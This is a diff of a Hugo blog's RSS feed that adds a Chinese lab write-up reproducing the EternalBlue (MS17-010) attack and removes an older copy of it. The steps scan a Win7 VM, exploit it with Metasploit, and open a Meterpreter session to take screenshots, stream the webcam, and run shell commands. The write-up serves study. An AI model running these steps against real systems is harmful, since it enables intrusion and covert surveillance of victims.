@@ -7,7 +7,85 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>xxx</copyright>
-        <lastBuildDate>Wed, 24 Dec 2025 16:36:27 +0800</lastBuildDate><atom:link href="https://neo-eo.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Wed, 31 Dec 2025 11:29:58 +0800</lastBuildDate><atom:link href="https://neo-eo.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>永恒之蓝复现</title>
+        <link>https://neo-eo.github.io/p/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/</link>
+        <pubDate>Wed, 31 Dec 2025 11:29:58 +0800</pubDate>
+        
+        <guid>https://neo-eo.github.io/p/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/</guid>
+        <description>&lt;h1 id=&#34;永恒之蓝复现&#34;&gt;永恒之蓝复现
+&lt;/h1&gt;&lt;h2 id=&#34;一环境配置&#34;&gt;一.环境配置
+&lt;/h2&gt;&lt;h3 id=&#34;安装kali并激活root用户&#34;&gt;安装kali并激活root用户
+&lt;/h3&gt;&lt;p&gt;1.sudo passwd root&lt;/p&gt;
+&lt;p&gt;2.根据提示：
+输入kali的密码
+设置root的密码
+再次设置root的密码&lt;/p&gt;
+&lt;p&gt;3.重启：reboot&lt;/p&gt;
+&lt;h3 id=&#34;准备靶机&#34;&gt;准备靶机
+&lt;/h3&gt;&lt;p&gt;在虚拟机上安装win7系统镜像作为靶机&lt;/p&gt;
+&lt;img src=&#34;image-20251030154257862.png&#34; alt=&#34;1&#34; style=&#34;zoom: 50%;&#34; /&gt;
+&lt;p&gt;kali和win7虚拟机配置都添加一个网络适配器（一个nat一个桥接）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://neo-eo.github.io/p/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/image-20251030154503369.png&#34;
+	width=&#34;432&#34;
+	height=&#34;53&#34;
+	srcset=&#34;https://neo-eo.github.io/p/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/image-20251030154503369_hu_85e4292bc03460bf.png 480w, https://neo-eo.github.io/p/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/image-20251030154503369_hu_e764c7bc493055df.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;2&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;815&#34;
+		data-flex-basis=&#34;1956px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;二实操&#34;&gt;二.实操
+&lt;/h2&gt;&lt;p&gt;永痕之蓝
+1.确定靶机的ip地址
+nmap 192.168.11.0/24 -p 445&lt;/p&gt;
+&lt;img src=&#34;image-20251030155004923.png&#34; alt=&#34;image-20251030155004923&#34; style=&#34;zoom: 80%;&#34; /&gt;
+&lt;p&gt;2.进入msf模块
+msfconsole&lt;/p&gt;
+&lt;img src=&#34;image-20251030155135683.png&#34; alt=&#34;image-20251030155135683&#34; style=&#34;zoom: 80%;&#34; /&gt;
+&lt;p&gt;3.搜索漏洞模块
+search ms17-010
+use 0&lt;/p&gt;
+&lt;img src=&#34;image-20251030155332195.png&#34; alt=&#34;image-20251030155332195&#34; style=&#34;zoom:80%;&#34; /&gt;
+&lt;p&gt;set rhost 192.168.11.142 (靶机的ip地址)
+set lport 0000 (本地监听的ip，被占用就要修改)&lt;/p&gt;
+&lt;img src=&#34;image-20251030155526840.png&#34; alt=&#34;image-20251030155526840&#34; style=&#34;zoom:80%;&#34; /&gt;
+&lt;p&gt;run&lt;/p&gt;
+&lt;p&gt;尝试连接之后进入meterprter即代表入侵成功对方机器&lt;/p&gt;
+&lt;p&gt;meterprter:&lt;/p&gt;
+&lt;img src=&#34;image-20251030155728527.png&#34; alt=&#34;image-20251030155728527&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;p&gt;webcam_stream   //打开靶机的摄像头 （因为摄像头需要对方先打开，所以就不截图了）
+screenshot     //截图  (会在kali中生成一个路径，是靶机的截图)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://neo-eo.github.io/p/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/image-20251030160005566.png&#34;
+	width=&#34;348&#34;
+	height=&#34;39&#34;
+	srcset=&#34;https://neo-eo.github.io/p/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/image-20251030160005566_hu_39e440499acb74cd.png 480w, https://neo-eo.github.io/p/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/image-20251030160005566_hu_551a3593979e942e.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;892&#34;
+		data-flex-basis=&#34;2141px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;将截图移到桌面&amp;ndash;mv /root/wACHyPDp.jpeg /root/Desktop&lt;/p&gt;
+&lt;p&gt;进入shell
+在meterprter里面输入shell，然后设置编码 chcp 65001&lt;/p&gt;
+&lt;img src=&#34;image-20251030161648040.png&#34; alt=&#34;image-20251030161648040&#34; style=&#34;zoom:80%;&#34; /&gt;
+&lt;p&gt;在靶机桌面创建内容为222的2.txt&lt;/p&gt;
+&lt;p&gt;首先查看靶机用户名&amp;ndash;net user&lt;/p&gt;
+&lt;img src=&#34;image-20251030161811845.png&#34; alt=&#34;image-20251030161811845&#34; style=&#34;zoom:80%;&#34; /&gt;
+&lt;p&gt;创建文档&amp;ndash;echo 222&amp;gt;C://Users/zhy-ict/Desktop/2.txt&lt;/p&gt;
+&lt;img src=&#34;image-20251030162056392.png&#34; alt=&#34;image-20251030162056392&#34; style=&#34;zoom: 150%;&#34; /&gt;
+&lt;img src=&#34;image-20251030162131237.png&#34; alt=&#34;image-20251030162131237&#34; style=&#34;zoom: 150%;&#34; /&gt;
+</description>
+        </item>
+        <item>
         <title>MyFirstBlog</title>
         <link>https://neo-eo.github.io/p/myfirstblog/</link>
         <pubDate>Wed, 24 Dec 2025 16:36:27 +0800</pubDate>
@@ -440,86 +518,6 @@ $$</description>
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;</description>
-        </item>
-        <item>
-        <title></title>
-        <link>https://neo-eo.github.io/p/</link>
-        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-        
-        <guid>https://neo-eo.github.io/p/</guid>
-        <description>&lt;h1 id=&#34;永恒之蓝复现&#34;&gt;永恒之蓝复现
-&lt;/h1&gt;&lt;h2 id=&#34;一环境配置&#34;&gt;一.环境配置
-&lt;/h2&gt;&lt;h3 id=&#34;安装kali并激活root用户&#34;&gt;安装kali并激活root用户
-&lt;/h3&gt;&lt;p&gt;1.sudo passwd root&lt;/p&gt;
-&lt;p&gt;2.根据提示：
-输入kali的密码
-设置root的密码
-再次设置root的密码&lt;/p&gt;
-&lt;p&gt;3.重启：reboot&lt;/p&gt;
-&lt;h3 id=&#34;准备靶机&#34;&gt;准备靶机
-&lt;/h3&gt;&lt;p&gt;在虚拟机上安装win7系统镜像作为靶机&lt;/p&gt;
-&lt;img src=&#34;image-20251030154257862.png&#34; alt=&#34;1&#34; style=&#34;zoom: 50%;&#34; /&gt;
-&lt;p&gt;kali和win7虚拟机配置都添加一个网络适配器（一个nat一个桥接）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://neo-eo.github.io/p/image-20251030154503369.png&#34;
-	width=&#34;432&#34;
-	height=&#34;53&#34;
-	srcset=&#34;https://neo-eo.github.io/p/image-20251030154503369_hu_85e4292bc03460bf.png 480w, https://neo-eo.github.io/p/image-20251030154503369_hu_e764c7bc493055df.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;2&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;815&#34;
-		data-flex-basis=&#34;1956px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;h2 id=&#34;二实操&#34;&gt;二.实操
-&lt;/h2&gt;&lt;p&gt;永痕之蓝
-1.确定靶机的ip地址
-nmap 192.168.11.0/24 -p 445&lt;/p&gt;
-&lt;img src=&#34;image-20251030155004923.png&#34; alt=&#34;image-20251030155004923&#34; style=&#34;zoom: 80%;&#34; /&gt;
-&lt;p&gt;2.进入msf模块
-msfconsole&lt;/p&gt;
-&lt;img src=&#34;image-20251030155135683.png&#34; alt=&#34;image-20251030155135683&#34; style=&#34;zoom: 80%;&#34; /&gt;
-&lt;p&gt;3.搜索漏洞模块
-search ms17-010
-use 0&lt;/p&gt;
-&lt;img src=&#34;image-20251030155332195.png&#34; alt=&#34;image-20251030155332195&#34; style=&#34;zoom:80%;&#34; /&gt;
-&lt;p&gt;set rhost 192.168.11.142 (靶机的ip地址)
-set lport 0000 (本地监听的ip，被占用就要修改)&lt;/p&gt;
-&lt;img src=&#34;image-20251030155526840.png&#34; alt=&#34;image-20251030155526840&#34; style=&#34;zoom:80%;&#34; /&gt;
-&lt;p&gt;run&lt;/p&gt;
-&lt;p&gt;尝试连接之后进入meterprter即代表入侵成功对方机器&lt;/p&gt;
-&lt;p&gt;meterprter:&lt;/p&gt;
-&lt;img src=&#34;image-20251030155728527.png&#34; alt=&#34;image-20251030155728527&#34; style=&#34;zoom:50%;&#34; /&gt;
-&lt;p&gt;webcam_stream   //打开靶机的摄像头 （因为摄像头需要对方先打开，所以就不截图了）
-screenshot     //截图  (会在kali中生成一个路径，是靶机的截图)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://neo-eo.github.io/p/image-20251030160005566.png&#34;
-	width=&#34;348&#34;
-	height=&#34;39&#34;
-	srcset=&#34;https://neo-eo.github.io/p/image-20251030160005566_hu_39e440499acb74cd.png 480w, https://neo-eo.github.io/p/image-20251030160005566_hu_551a3593979e942e.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20251030160005566&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;892&#34;
-		data-flex-basis=&#34;2141px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;将截图移到桌面&amp;ndash;mv /root/wACHyPDp.jpeg /root/Desktop&lt;/p&gt;
-&lt;p&gt;进入shell
-在meterprter里面输入shell，然后设置编码 chcp 65001&lt;/p&gt;
-&lt;img src=&#34;image-20251030161648040.png&#34; alt=&#34;image-20251030161648040&#34; style=&#34;zoom:80%;&#34; /&gt;
-&lt;p&gt;在靶机桌面创建内容为222的2.txt&lt;/p&gt;
-&lt;p&gt;首先查看靶机用户名&amp;ndash;net user&lt;/p&gt;
-&lt;img src=&#34;image-20251030161811845.png&#34; alt=&#34;image-20251030161811845&#34; style=&#34;zoom:80%;&#34; /&gt;
-&lt;p&gt;创建文档&amp;ndash;echo 222&amp;gt;C://Users/zhy-ict/Desktop/2.txt&lt;/p&gt;
-&lt;img src=&#34;image-20251030162056392.png&#34; alt=&#34;image-20251030162056392&#34; style=&#34;zoom:80%;&#34; /&gt;
-&lt;img src=&#34;image-20251030162131237.png&#34; alt=&#34;image-20251030162131237&#34; style=&#34;zoom:50%;&#34; /&gt;
-</description>
         </item>
         
     </channel>
